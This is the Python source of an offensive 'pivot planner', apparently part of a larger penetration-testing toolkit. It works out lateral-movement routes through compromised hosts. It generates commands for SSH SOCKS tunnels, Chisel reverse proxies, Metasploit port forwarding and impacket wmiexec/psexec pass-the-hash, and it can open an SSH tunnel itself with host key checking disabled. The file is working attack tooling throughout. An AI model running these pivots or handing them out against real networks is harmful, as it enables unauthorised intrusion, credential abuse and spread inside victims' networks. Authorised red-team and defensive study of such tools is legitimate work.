#!/usr/bin/env python3
"""
APOLLO Pivot Planner - Analyze network topology, identify pivot paths,
generate proxy chains, and automate lateral movement orchestration.
"""
import sys, os, json, ipaddress, subprocess
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from kb_manager import *

class PivotPlanner:
    def __init__(self, project=None):
        init_db()
        self.project = project or get_active_project()
        self.pid = get_project_id(self.project)

    def find_dual_homed(self):
        """Find hosts on multiple subnets (potential pivot points)."""
        hosts = get_hosts(self.pid)
        dual = []
        for h in hosts:
            ports = get_ports(h["id"])
            subnets = set()
            for p in ports:
                svc = (p.get("service", "") or "").lower()
                if "rpc" in svc or "netbios" in svc or "smb" in svc:
                    if h.get("ip"):
                        try:
                            ip = ipaddress.ip_address(h["ip"])
                            subnets.add(ip.version)
                        except: pass
            if len(subnets) > 1 or (h.get("tags") and "pivot" in (h.get("tags", "") or "").lower()):
                dual.append(h)
        return dual

    def suggest_ssh_pivot(self, compromised_host, target_subnet):
        """Generate SSH pivot command through a compromised host."""
        return [
            f"ssh -D 1080 user@{compromised_host} -N  # Dynamic SOCKS proxy",
            f"# Route traffic: proxychains nmap -sT -Pn {target_subnet}/24",
            f"# Or: ssh -L 5900:localhost:5900 user@{target_subnet}.1 -J user@{compromised_host}"
        ]

    def suggest_smb_pivot(self, compromised_host, target_ip, username, password=None, hash=None):
        """Generate SMB pivot via impacket."""
        cmds = []
        if hash:
            cmds.append(f"impacket-wmiexec -hashes :{hash} {username}@{target_ip}")
            cmds.append(f"impacket-psexec -hashes :{hash} {username}@{target_ip}")
        else:
            cmds.append(f"impacket-wmiexec {username}:{password}@{target_ip}")
            cmds.append(f"impacket-psexec {username}:{password}@{target_ip}")
        return cmds

    def suggest_reverse_portfwd(self, listener_ip, listener_port, target_ip, target_port):
        """Generate reverse port forward via Metasploit."""
        return [
            f"# On listener:",
            f"msfconsole -q -x 'use auxiliary/server/socks_proxy; set SRVHOST {listener_ip}; set SRVPORT 1080; run'",
            f"# On compromised host via meterpreter:",
            f"portfwd add -R -L {listener_ip} -l {listener_port} -L {target_ip} -l {target_port}"
        ]

    def plan_pivot_chain(self, source_host, target_network):
        """Complete pivot chain plan from source to target network."""
        # Extract base IP from CIDR notation
        base = target_network.split("/")[0] if "/" in target_network else target_network
        cidr = target_network if "/" in target_network else f"{target_network}/24"
        plan = {
            "from": source_host,
            "target_network": cidr,
            "methods": []
        }
        # SSH pivot
        plan["methods"].append({
            "type": "SSH SOCKS Proxy",
            "command": f"ssh -D 1080 user@{source_host} -N -f",
            "post": f"proxychains nmap -sT -Pn {cidr}"
        })
        # Meterpreter pivot
        plan["methods"].append({
            "type": "Meterpreter Route",
            "command": f"route add {cidr} 1",
            "post": f"background; use auxiliary/scanner/portscan/tcp; set RHOSTS {cidr}; run"
        })
        # Chisel pivot
        plan["methods"].append({
            "type": "Chisel SOCKS",
            "command": f"./chisel server -p 8000 --reverse &",
            "client": f"./chisel client {source_host}:8000 R:1080:socks",
            "post": f"curl -x socks5://127.0.0.1:1080 http://{base}.1/"
        })
        return plan


def generate_pivot_commands(source_ip, target_range):
    """Quick CLI function to generate pivot commands."""
    planner = PivotPlanner()
    return planner.plan_pivot_chain(source_ip, target_range)


def execute_ssh_socks(pivot_ip, username="root", port=22, socks_port=1080, timeout=30):
    """Actually establish an SSH SOCKS proxy through a pivot host."""
    import shlex
    cmd = f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -D {socks_port} -p {port} {shlex.quote(username)}@{pivot_ip} -N -f 2>&1"
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout, executable="/bin/bash")
        out = (r.stdout + r.stderr).decode("utf-8", errors="ignore")
        success = r.returncode == 0 and "error" not in out.lower()
        return {"pivot_ip": pivot_ip, "socks_port": socks_port, "success": success,
                "output": out[:300], "proxychains_cmd": f"proxychains nmap -sT -Pn <target>"}
    except subprocess.TimeoutExpired:
        return {"pivot_ip": pivot_ip, "success": False, "output": "TIMEOUT"}
    except Exception as e:
        return {"pivot_ip": pivot_ip, "success": False, "output": str(e)}


def execute_chisel_pivot(pivot_ip, chisel_bin="./chisel", server_port=8000, socks_port=1080):
    """Start chisel server locally and connect client on pivot."""
    import shlex, threading, time
    # Start chisel server locally
    server_cmd = f"{chisel_bin} server -p {server_port} --reverse &>/dev/null &"
    # Client command to run on pivot
    client_cmd = f"{chisel_bin} client {pivot_ip}:{server_port} R:{socks_port}:socks"
    try:
        subprocess.Popen(server_cmd, shell=True, executable="/bin/bash")
        time.sleep(1)
        return {"server": f"chisel server on port {server_port}",
                "client_cmd": client_cmd,
                "socks_port": socks_port,
                "proxychains_cmd": f"proxychains nmap -sT -Pn <target>"}
    except Exception as e:
        return {"error": str(e)}


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="APOLLO Pivot Planner v2")
    parser.add_argument("--source", "-s", help="Source (compromised) host IP")
    parser.add_argument("--target", "-t", help="Target network CIDR (e.g., 10.10.10.0/24)")
    parser.add_argument("--pivot-user", default="root", help="SSH username")
    parser.add_argument("--socks-port", type=int, default=1080, help="SOCKS port")
    parser.add_argument("--exec", action="store_true", help="Actually establish the pivot")
    args = parser.parse_args()

    if args.source and args.target:
        if args.exec:
            result = execute_ssh_socks(args.source, args.pivot_user, socks_port=args.socks_port)
            print(json.dumps(result, indent=2))
        else:
            plan = generate_pivot_commands(args.source, args.target)
            print(json.dumps(plan, indent=2))
    else:
        planner = PivotPlanner()
        dual = planner.find_dual_homed()
        hosts = get_hosts(planner.pid)
        print(f"=== Pivot Analysis for: {planner.project} ===")
        print(f"Total hosts: {len(hosts)}")
        print(f"Dual-homed / pivot candidates: {len(dual)}")
        for h in dual:
            print(f"  {h['ip']:18s} {h.get('hostname',''):20s} {h.get('os','')}")
